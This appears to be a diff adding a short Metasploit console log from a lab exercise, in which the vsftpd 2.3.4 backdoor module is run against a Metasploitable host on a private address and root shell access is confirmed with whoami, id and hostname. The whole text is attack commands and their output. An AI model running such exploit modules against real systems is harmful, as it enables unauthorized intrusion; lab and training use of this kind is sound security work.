@@ -1,0 +1,9 @@
+msf exploit(unix/ftp/vsftpd_234_backdoor) > run
+[+] 192.168.56.105:21 - Backdoor service has been spawned
+[*] Command shell session 1 opened
+whoami
+root
+id
+uid=0(root) gid=0(root)
+hostname
+metasploitable
